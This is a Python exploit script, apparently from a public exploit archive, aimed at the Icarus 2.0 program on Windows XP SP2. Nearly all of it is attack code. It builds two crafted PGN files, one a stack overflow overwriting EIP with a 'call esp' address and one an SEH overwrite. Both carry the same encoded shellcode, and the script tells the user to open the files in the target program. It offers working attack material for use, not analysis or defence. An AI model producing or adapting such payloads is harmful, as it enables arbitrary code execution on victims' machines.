#!/usr/bin/python
#usage: exploit.py
print "********************************************************************"
print " Icarus 2.0 Local Stack Overflow Exploit\n"
print " Download: http://www.randomsoftware.com/pub/icarus.exe"
print " Author : His0k4"
print " Tested on: Windows XP Pro SP2 Fr\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz)\n"
print " Tip of the day: Klimontayne fe romayne :D"
print "********************************************************************\n\n"

					
payload1 =   "\x41" * 336
payload1 +=  "\x5D\x38\x82\x7C" # call esp kernel32.dll (sp2)
payload1 +=  "\x90" * 19 #some nops
payload1 +=  "\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38"
payload1 +=  "\x4e\xf9\x9f\x83\xeb\xfc\xe2\xf4\xc4\xa6\xbd\x9f\x38\x4e\x72\xda"
payload1 +=  "\x04\xc5\x85\x9a\x40\x4f\x16\x14\x77\x56\x72\xc0\x18\x4f\x12\xd6"
payload1 +=  "\xb3\x7a\x72\x9e\xd6\x7f\x39\x06\x94\xca\x39\xeb\x3f\x8f\x33\x92"
payload1 +=  "\x39\x8c\x12\x6b\x03\x1a\xdd\x9b\x4d\xab\x72\xc0\x1c\x4f\x12\xf9"
payload1 +=  "\xb3\x42\xb2\x14\x67\x52\xf8\x74\xb3\x52\x72\x9e\xd3\xc7\xa5\xbb"
payload1 +=  "\x3c\x8d\xc8\x5f\x5c\xc5\xb9\xaf\xbd\x8e\x81\x93\xb3\x0e\xf5\x14"
payload1 +=  "\x48\x52\x54\x14\x50\x46\x12\x96\xb3\xce\x49\x9f\x38\x4e\x72\xf7"
payload1 +=  "\x04\x11\xc8\x69\x58\x18\x70\x67\xbb\x8e\x82\xcf\x50\xbe\x73\x9b"
payload1 +=  "\x67\x26\x61\x61\xb2\x40\xae\x60\xdf\x2d\x98\xf3\x5b\x4e\xf9\x9f"
junk     =   "\xCC"*7000


payload2 =	 "\x5B\x46\x6F\x72\x6D\x61\x74\x20\x22\x4C\x65\x63\x74\x75\x72\x65\x22\x5D"
payload2 +=  "\x0A\x5B\x54\x69\x74\x6C\x65\x20\x22\x65\x78\x70\x6C\x6F\x69\x74\x22\x5D"
payload2 +=  "\x0A\x0A"
payload2 +=  "\x41"*788
payload2 +=  "\xEB\x06\x90\x90" # jmp +6
payload2 +=  "\xE9\x10\x37\x01" # universal pop pop ret
payload2 +=  "\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38"
payload2 +=  "\x4e\xf9\x9f\x83\xeb\xfc\xe2\xf4\xc4\xa6\xbd\x9f\x38\x4e\x72\xda"
payload2 +=  "\x04\xc5\x85\x9a\x40\x4f\x16\x14\x77\x56\x72\xc0\x18\x4f\x12\xd6"
payload2 +=  "\xb3\x7a\x72\x9e\xd6\x7f\x39\x06\x94\xca\x39\xeb\x3f\x8f\x33\x92"
payload2 +=  "\x39\x8c\x12\x6b\x03\x1a\xdd\x9b\x4d\xab\x72\xc0\x1c\x4f\x12\xf9"
payload2 +=  "\xb3\x42\xb2\x14\x67\x52\xf8\x74\xb3\x52\x72\x9e\xd3\xc7\xa5\xbb"
payload2 +=  "\x3c\x8d\xc8\x5f\x5c\xc5\xb9\xaf\xbd\x8e\x81\x93\xb3\x0e\xf5\x14"
payload2 +=  "\x48\x52\x54\x14\x50\x46\x12\x96\xb3\xce\x49\x9f\x38\x4e\x72\xf7"
payload2 +=  "\x04\x11\xc8\x69\x58\x18\x70\x67\xbb\x8e\x82\xcf\x50\xbe\x73\x9b"
payload2 +=  "\x67\x26\x61\x61\xb2\x40\xae\x60\xdf\x2d\x98\xf3\x5b\x4e\xf9\x9f"
payload2 +=  "\xCC"*7000



try:
    out_file = open("exploit_eip.PGN",'w')
    out_file.write(payload1+junk)
    out_file.close()
    print "Eip exploit File Created!\nNow you can run this file directly\n"
except:
    print "Error"
try:
    out_file = open("exploit_seh.PGN",'w')
    out_file.write(payload2)
    out_file.close()
    print "Seh exploit File Created!\nOpen Icarus then game>load and chose exploit_seh.PGN\n"
except:
    print "Error"	
